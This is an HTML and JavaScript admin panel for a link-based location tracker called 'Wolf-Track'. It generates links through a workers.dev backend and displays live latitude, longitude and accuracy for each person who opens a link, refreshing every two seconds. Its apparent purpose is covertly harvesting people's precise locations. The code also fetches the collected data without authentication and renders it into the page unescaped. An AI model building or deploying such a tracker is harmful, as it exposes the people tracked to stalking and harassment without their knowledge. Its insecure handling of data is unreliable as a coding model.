<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Wolf-Track Admin</title>

<style>
*{box-sizing:border-box}
html,body{
  margin:0;
  width:100%;
  height:100%;
  font-family:system-ui;
  background:#1f2933;
}

/* CENTER FIX */
body{
  display:flex;
  justify-content:center;
  align-items:center;
}

/* APP */
.app{
  width:360px;
  height:640px;
  background:#f4f6f8;
  border-radius:20px;
  overflow:hidden;
  box-shadow:0 20px 40px rgba(0,0,0,.4);
  display:flex;
  flex-direction:column;
}

/* HEADER */
.header{
  height:140px;
  background:linear-gradient(180deg,#3b82f6,#2563eb);
  position:relative;
}
.header::after{
  content:"";
  position:absolute;
  bottom:-30px;
  left:0;
  width:100%;
  height:60px;
  background:#f4f6f8;
  border-radius:50% 50% 0 0;
}

/* LOGO */
.logo{
  position:absolute;
  bottom:-40px;
  left:50%;
  transform:translateX(-50%);
  width:90px;
  height:90px;
  border-radius:50%;
  background:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:800;
  color:#2563eb;
  box-shadow:0 6px 16px rgba(0,0,0,.2);
}

/* CARD */
.card{
  background:#fff;
  margin:60px 16px 16px;
  padding:16px;
  border-radius:16px;
  box-shadow:0 6px 18px rgba(0,0,0,.1);
  flex:1;
  overflow:auto;
}

/* INPUT + BUTTON */
input{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:1px solid #d1d5db;
  margin-top:10px;
}

button{
  width:100%;
  padding:12px;
  margin-top:10px;
  background:#2563eb;
  color:#fff;
  border:none;
  border-radius:999px;
  font-weight:600;
  cursor:pointer;
}

/* LINK BOX */
.link-box{
  display:flex;
  gap:6px;
  margin-top:10px;
}
.link-box input{
  margin:0;
}
.copy-btn{
  padding:0 14px;
  border-radius:10px;
  background:#2563eb;
  color:#fff;
  border:none;
  cursor:pointer;
}

/* SECTIONS */
.section{
  margin-top:14px;
  padding:12px;
  border-radius:14px;
  border:1px solid #e5e7eb;
}

.section h4{
  margin:0 0 6px;
  font-size:14px;
  color:#2563eb;
}

/* STATUS */
.status{
  display:flex;
  justify-content:space-between;
  font-size:13px;
}
.dot{
  width:8px;
  height:8px;
  border-radius:50%;
  background:#22c55e;
}

/* MAP */
.map{
  height:110px;
  border-radius:12px;
  background:#e5e7eb;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  font-size:13px;
  color:#374151;
}

/* USERS */
.user{
  margin-top:10px;
  padding:10px;
  border-radius:10px;
  border:1px solid #e5e7eb;
  font-size:13px;
}

/* LOADER */
.loader{
  display:none;
  text-align:center;
  margin-top:10px;
  font-weight:600;
}
</style>
</head>

<body>

<div class="app">

  <div class="header">
    <div class="logo">WOLF</div>
  </div>

  <!-- LOGIN -->
  <div class="card" id="loginBox">
    <h3 style="text-align:center;margin:0">Admin Login</h3>
    <input id="pass" type="password" placeholder="Enter your key here">
    <button onclick="login()">ENTER</button>
  </div>

  <!-- PANEL -->
  <div class="card" id="panel" style="display:none">

    <button onclick="generate()">GENERATE LINK</button>

    <div class="link-box">
      <input id="link" readonly placeholder="your link is here">
      <button class="copy-btn" onclick="copyLink()">📋</button>
    </div>

    <div class="loader" id="loader">Loading…</div>

    <div class="section">
      <h4>User info</h4>
      <div class="status"><span>link clicked</span><span class="dot"></span></div>
      <div class="status"><span>active</span><span class="dot"></span></div>
    </div>

    <div class="section">
      <h4>User location</h4>
      <div class="map" id="map">
        Waiting for data…
      </div>
    </div>

    <div id="users"></div>
  </div>

</div>

<script>
const API="https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
let sessionId=null;
let lastCoords=null;

function login(){
  fetch(API+"/login",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({password:pass.value})
  })
  .then(r=>r.json())
  .then(d=>{
    sessionId=d.sessionId;
    loginBox.style.display="none";
    panel.style.display="block";
    load();
  })
  .catch(()=>alert("Wrong password"));
}

function generate(){
  loader.style.display="block";
  fetch(API+"/create-link",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({sessionId})
  })
  .then(r=>r.json())
  .then(d=>{
    link.value=d.link;
    loader.style.display="none";
  });
}

function copyLink(){
  navigator.clipboard.writeText(link.value);
  alert("Link copied!");
}

async function load(){
  loader.style.display="block";
  const r=await fetch(API+"/admin-data");
  const data=await r.json();
  users.innerHTML="";

  for(const t in data){
    const u=data[t];
    lastCoords=u;
    users.innerHTML+=`
      <div class="user">
        <b>${t}</b><br>
        ${u.lat}, ${u.lng}<br>
        Accuracy: ${u.acc}m
      </div>`;
  }

  if(lastCoords){
    map.innerHTML=`
      <div><b>Latitude:</b> ${lastCoords.lat}</div>
      <div><b>Longitude:</b> ${lastCoords.lng}</div>
      <div><b>Accuracy:</b> ${lastCoords.acc}m</div>
    `;
  }

  loader.style.display="none";
}

setInterval(load,2000);
</script>

</body>
</html>
